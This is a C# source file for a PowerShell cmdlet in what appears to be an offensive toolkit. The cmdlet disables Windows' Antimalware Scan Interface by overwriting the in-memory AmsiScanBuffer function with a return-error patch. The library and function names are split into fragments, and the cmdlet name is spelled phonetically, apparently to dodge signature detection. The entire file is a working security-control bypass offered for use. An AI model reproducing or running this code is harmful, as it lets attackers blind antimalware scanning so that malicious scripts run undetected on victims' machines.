using System;
using System.Management.Automation;
using System.Runtime.InteropServices;
using TurtleToolKitManaged;


// [System.Security.Principal.windowsidentity]::GetCurrent() <- get token
// credit to sharpsploit for this patch 
namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Disable, "AyEmEsEye")] // <- seeting cmdlet name and verbs
    [Alias("DAYEMESAYE")] //<- cmdlet alias
    public class DisableAMSI : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            WriteVerbose("Only works on 64 bit");
            if (!PatchAmsiBuff())
            {
                WriteWarning("Failed to patch ay em ess eye");
                return;
            }
            WriteVerbose("Success");
            return;
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }


        //taken from sharp-sploit
        public static bool PatchAmsiBuff()
        {

            // only works on 64bit
            byte[] patch;
            patch = new byte[6] { 0xB8,0x57,0x00,0x07,0x80,0xC3 };
            try
            {
                string libName = "a" + "msi" + ".dll";
                string funcName = "Am" + "siSca" + "nBu" +"ff" + "er";
                var lib = Win32.LoadLibrary(libName);
                var addr = Win32.GetProcAddress(lib, funcName);
                if (addr == null)
                {
                    Console.Write("ay em si eye not loadeded into memory exiting...");
                    return false;
                }
                uint oldProtect;
                if (!Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                {
                    Console.WriteLine("Failed to change memory protection -> " + Marshal.GetLastWin32Error());
                    return false;

                }
                Marshal.Copy(patch, 0, addr, patch.Length);
                if (!Win32.VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect))
                {
                    Console.WriteLine("Failed to revert memory protection");
                    return false;
                }
                return true;
            } catch (Exception e)
            {
                Console.WriteLine("Exception: " + e.Message);
                return false;
            }
        }
    }
}